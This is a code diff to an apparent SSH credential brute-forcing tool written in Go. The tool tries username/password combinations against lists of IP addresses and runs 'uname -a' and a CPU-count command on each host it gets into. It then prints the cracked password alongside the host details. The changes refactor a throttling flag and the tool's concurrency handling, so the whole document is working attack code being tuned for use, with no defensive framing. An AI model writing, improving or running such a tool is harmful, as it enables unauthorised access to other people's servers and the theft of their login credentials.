@@ -22,7 +22,7 @@ var (
 	ip       string
 	threads  string
 	timeouts string
-	xc       bool
+	throttle bool
 )
 
 func init() {
@@ -73,9 +73,9 @@ func main() {
 			for ix, _ := range ips {
 				time.Sleep(1 * time.Millisecond)
 				wg.Add(1)
-				xc = true
 				go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
-				if xc == false {
+				if throttle == false {
+					throttle = true
 					i, _ := strconv.Atoi(timeouts)
 					time.Sleep(time.Duration(i) * time.Second)
 				}
@@ -112,15 +112,16 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		Timeout: time.Duration(i) * time.Second,
 	}
 
+	defer wg.Done()
+
 	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
 	if err != nil {
-		xc = false
+		throttle = false
 		return
 	} else {
 		session, err := client.NewSession()
 		if err != nil {
-			xc = false
-			wg.Done()
+			throttle = false
 			return
 		}
 
@@ -130,8 +131,7 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		session.Close()
 
 		if err != nil {
-			xc = false
-			wg.Done()
+			throttle = false
 			return
 		}
 
@@ -140,8 +140,7 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		session1, err := client.NewSession()
 
 		if err != nil {
-			xc = false
-			wg.Done()
+			throttle = false
 			return
 		}
 
@@ -151,8 +150,7 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		session1.Close()
 
 		if err != nil {
-			xc = false
-			wg.Done()
+			throttle = false
 			return
 		}
 
@@ -160,7 +158,7 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		unamea := strings.Replace(b.String(), "\n", "", -1)
 		cpus := strings.Replace(b1.String(), "\n", "", -1)
 		if cpus == "" {
-			cpus = "0"
+			cpus = "Invalid"
 		}
 		cp, _ := strconv.ParseInt(cpus, 10, 64)
 		outs := "\nNetwork Details -> " + user + "@" + addr + ":" + port + "\nServer login password found -> " + pass + "\nOS Info -> " + unamea + "\nCPUs count -> " + cpus + "\n"
@@ -178,5 +176,5 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 			fmt.Printf("\nNetwork Details -> %v@%v:%v\nServer login password found -> %v\nOS Info -> %v\nCPUs count -> %v\n", user, addr, port, pass, unamea, cpus)
 		}
 	}
-	wg.Done()
+
 }
